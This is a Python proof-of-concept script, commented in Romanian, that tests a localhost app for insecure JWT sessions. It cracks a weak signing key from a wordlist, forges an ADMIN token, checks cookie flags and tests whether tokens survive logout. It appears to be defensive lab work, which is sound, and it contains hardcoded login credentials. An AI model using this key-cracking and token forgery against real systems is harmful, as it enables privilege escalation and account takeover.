#!/usr/bin/env python3
"""
PoC 4.5 - Gestionare Nesigura a Sesiunilor (JWT)
Demonstreaza si testeaza atat V1 cat si V2:
  (a) JWT cu cheie slaba -> crack offline
  (b) Cookie fara HttpOnly/Secure -> furt via XSS simulat
  (c) Token valabil 1 an / valid dupa logout -> session hijacking
"""

import requests
import jwt
import datetime

BASE_URL = "http://localhost:5000"

EMAIL    = "cosmin@gmail.com"
PASSWORD = "Cosmin28#"

print("=" * 60)
print("PoC 4.5 - Gestionare Nesigura a Sesiunilor (Universal V1 & V2)")
print("=" * 60)

# --- Pasul 1: Login si obtinere token ---
print("\n[1] Login pentru obtinere token JWT...")
r = requests.post(f"{BASE_URL}/api/login", json={"email": EMAIL, "password": PASSWORD})
if r.status_code != 200:
    print(f"    Login esuat: {r.status_code} {r.text}")
    print("    (Asigura-te ca userul exista in DB si parola e corecta)")
    token = "DEMO_TOKEN"
else:
    # Magie Universala: ia token-ul din JSON (pt V1) sau din Cookie (pt V2)
    token = r.json().get("token")
    if not token:
        token = r.cookies.get("session_id")
    print(f"    Token obtinut: {str(token)[:60]}...")

# --- Pasul 2: Crack cheie JWT slaba ---
print("\n[2] Incercare crack cheie JWT slaba (brute force offline)...")
WEAK_KEYS = [
    "secret", "secret-key", "secret-foarte-slab-123",
    "jwt_secret", "mysecret", "password", "authx", "123456"
]

cracked_key = None
for key in WEAK_KEYS:
    try:
        decoded = jwt.decode(token, key, algorithms=["HS256"])
        print(f"    [!!!] CHEIE GASITA: '{key}'")
        print(f"    [!!!] Payload decodat: {decoded}")
        cracked_key = key
        break
    except jwt.InvalidSignatureError:
        print(f"    [miss] Cheia '{key}' nu e corecta.")
    except Exception as e:
        # Prindem eroarea cand token-ul nu este valid pentru formatul jwt.decode
        print(f"    [?] Eroare la decodare pt '{key}' -> {e}")
        break

# --- Pasul 3: Forjare token cu rol ADMIN ---
if cracked_key:
    print(f"\n[3] Forjare token cu rol ADMIN folosind cheia '{cracked_key}'...")
    forged = jwt.encode({
        "user_id": 1,
        "role": "ADMIN",
        "exp": datetime.datetime.utcnow() + datetime.timedelta(days=365)
    }, cracked_key, algorithm="HS256")
    print(f"    Token forjat: {forged[:80]}...")
    print(f"    [VULNERABIL] Acum putem face request-uri ca ADMIN!")
else:
    print("\n[3] Cheia nu a fost crackata din lista scurta.")
    print("    [✓ SECURIZAT] Serverul foloseste o cheie puternica/secreta!")

# --- Pasul 4: Cookie fara HttpOnly -> XSS ---
print("\n[4] Verificare flags cookie...")
try:
    r2 = requests.post(f"{BASE_URL}/api/login",
                       json={"email": EMAIL, "password": PASSWORD},
                       allow_redirects=False)
    cookie_header = r2.headers.get("Set-Cookie", "")
    
    if not cookie_header:
        print("    [VULNERABIL] Nu s-a setat niciun cookie de sesiune!")
    else:
        print(f"    Set-Cookie header: {cookie_header[:60]}...")
        is_secure = True
        
        if "HttpOnly" not in cookie_header:
            print("    [VULNERABIL] HttpOnly LIPSA -> cookie accesibil din JavaScript!")
            is_secure = False
        if "Secure" not in cookie_header:
            print("    [VULNERABIL] Secure LIPSA -> cookie transmis si pe HTTP (nencriptat)!")
            is_secure = False
        if "SameSite" not in cookie_header:
            print("    [VULNERABIL] SameSite LIPSA -> expus la CSRF!")
            is_secure = False
            
        if is_secure:
            print("    [✓ SECURIZAT] Cookie-ul are toate flag-urile (HttpOnly, Secure, SameSite)!")
except Exception as e:
    print(f"    Nu s-a putut verifica: {e}")

# --- Pasul 5: Token valid dupa logout ---
print("\n[5] Testare invalidare token la logout...")
try:
    headers = {"Authorization": f"Bearer {token}"}
    cookies = {"session_id": token} # Trimitem si cookie pt V2
    
    logout_r = requests.post(f"{BASE_URL}/api/logout", headers=headers, cookies=cookies)
    print(f"    Logout response: {logout_r.json()}")
    
    # Incercam sa accesam o resursa protejata DUPA logout
    tickets_r = requests.get(f"{BASE_URL}/api/tickets", headers=headers, cookies=cookies)
    print(f"    Acces /api/tickets DUPA logout: HTTP {tickets_r.status_code}")
    
    if tickets_r.status_code == 200:
        print("    [VULNERABIL] Token inca valid dupa logout! Session hijacking posibil.")
    elif tickets_r.status_code == 401:
        print("    [✓ SECURIZAT] Acces respins (401). Token-ul a fost invalidat (blacklist)!")
except Exception as e:
    print(f"    {e}")

print()